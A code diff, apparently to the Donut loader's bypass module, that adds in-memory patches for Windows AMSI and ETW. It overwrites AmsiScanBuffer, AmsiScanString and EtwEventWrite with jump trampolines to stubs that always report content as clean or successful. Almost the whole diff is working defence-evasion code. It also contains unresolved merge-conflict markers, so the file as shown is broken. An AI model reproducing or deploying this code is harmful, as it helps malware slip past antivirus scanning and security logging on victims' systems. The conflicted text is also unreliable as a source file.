@@ -30,8 +30,89 @@
 */
 
 #include "bypass.h"
+#define BYPASS_AMSI_E
+#define BYPASS_ETW_C
 
+<<<<<<< HEAD
 #if defined(BYPASS_AMSI_A)
+=======
+#if defined(BYPASS_AMSI_E) || defined(BYPASS_ETW_C)
+BOOL ReplaceTarget(PDONUT_INSTANCE inst, BYTE* function, LPVOID target, DWORD function_len) {
+  DWORD op, t;
+
+  if(!inst->api.VirtualProtect(target, function_len, PAGE_EXECUTE_READWRITE, &op)) 
+    return FALSE;
+  DPRINT("Overwriting function at: 0x%p", function);
+  Memcpy(target, function, function_len);
+  if(!inst->api.VirtualProtect(target, function_len, op, &t))
+    return FALSE;
+  return TRUE;
+}
+#endif
+
+#if defined(BYPASS_AMSI_E)
+HRESULT WINAPI AmsiScanBufferStub(
+    HAMSICONTEXT amsiContext,
+    PVOID        buffer,
+    ULONG        length,
+    LPCWSTR      contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT  *result)
+{    
+    *result = AMSI_RESULT_CLEAN;
+    return S_OK;
+}
+
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+  HMODULE dll;
+  DWORD   len = 0;
+  LPVOID  cs;
+
+#ifdef _WIN64
+  BYTE funcBytes[12]; // Rozmiar dla 48 B8 (2 bajty) + imm64 (8 bajtów) + FF E0 (2 bajty)
+
+  funcBytes[0] = 0x48; // REX prefix
+  funcBytes[1] = 0xB8; // MOV RAX, imm64
+  *(uint64_t*)(funcBytes + 2) = (uint64_t)(AmsiScanBufferStub); // imm64 (adres funkcji)
+  funcBytes[10] = 0xFF; // JMP RAX
+  funcBytes[11] = 0xE0;
+  len = 12;
+#else
+  BYTE funcBytes[7];
+
+  funcBytes[0] = 0xB8;
+  *(DWORD*)(funcBytes + 1) = ADR(DWORD, AmsiScanBufferStub);
+  funcBytes[5] = 0xFF;
+  funcBytes[6] = 0xE0;
+  len = 7;
+#endif
+  DPRINT("AmsiScanBufferStub: 0x%p", AmsiScanBufferStub);
+  DPRINT("Function bytes: ");
+    for (int i = 0; i < len; i++) {
+      DPRINT("%02X ", funcBytes[i]); // Wyświetlenie bajtów w formacie szesnastkowym
+    }
+  DPRINT("\n");
+
+  dll = xGetLibAddress(inst, inst->amsi);
+  if(dll == NULL) return TRUE;
+  
+  cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+
+  cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+  
+  return TRUE;
+}
+
+#elif defined(BYPASS_AMSI_A)
+>>>>>>> c16aad1a1add85b861d4fa9dbb736ceb904c5ad3
 // This is where you may define your own AMSI bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
@@ -47,7 +128,7 @@ HRESULT WINAPI AmsiScanBufferStub(
     LPCWSTR      contentName,
     HAMSISESSION amsiSession,
     AMSI_RESULT  *result)
-{
+{    
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
 }
@@ -384,11 +465,16 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
 }
 #endif
 
-#if defined(BYPASS_ETW_A)
+#if defined(BYPASS_ETW_NONE)
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+  return TRUE;
+}
+
+#elif defined(BYPASS_ETW_A)
 // This is where you may define your own ETW bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
 BOOL DisableETW(PDONUT_INSTANCE inst) {
-    return TRUE;
+  return TRUE;
 }
 
 #elif defined(BYPASS_ETW_B)
@@ -443,6 +529,61 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
     return TRUE;
 
+}
+#elif defined(BYPASS_ETW_C)
+ULONG WINAPI EtwEventWriteStub(
+    REGHANDLE RegHandle,
+    PCEVENT_DESCRIPTOR EventDescriptor,
+    ULONG UserDataCount,
+    PEVENT_DATA_DESCRIPTOR UserData) 
+{
+  #ifdef _WIN64
+    return 0;
+  #else
+    return 0x14;
+  #endif
+}
+
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+  HMODULE dll;
+  DWORD   len = 0;
+  LPVOID  cs;
+
+#ifdef _WIN64
+  BYTE funcBytes[12]; // Rozmiar dla 48 B8 (2 bajty) + imm64 (8 bajtów) + FF E0 (2 bajty)
+
+  funcBytes[0] = 0x48; // REX prefix
+  funcBytes[1] = 0xB8; // MOV RAX, imm64
+  *(uint64_t*)(funcBytes + 2) = (uint64_t)(EtwEventWriteStub); // imm64 (adres funkcji)
+  funcBytes[10] = 0xFF; // JMP RAX
+  funcBytes[11] = 0xE0;
+  len = 12;
+#else
+  BYTE funcBytes[7];
+
+  funcBytes[0] = 0xB8;
+  *(DWORD*)(funcBytes + 1) = ADR(DWORD, EtwEventWriteStub);
+  funcBytes[5] = 0xFF;
+  funcBytes[6] = 0xE0;
+  len = 7;
+#endif
+  DPRINT("EtwEventWriteStub: 0x%p", EtwEventWriteStub);
+  DPRINT("Function bytes: ");
+    for (int i = 0; i < len; i++) {
+      DPRINT("%02X ", funcBytes[i]); // Wyświetlenie bajtów w formacie szesnastkowym
+    }
+  DPRINT("\n");
+
+  dll = xGetLibAddress(inst, inst->ntdll);
+  if(dll == NULL) return TRUE;
+  
+  cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
+  if(cs == NULL) return FALSE;
+
+  if(!ReplaceTarget(inst, funcBytes, cs, len))
+    return FALSE;
+  
+  return TRUE;
 }
 
 #endif
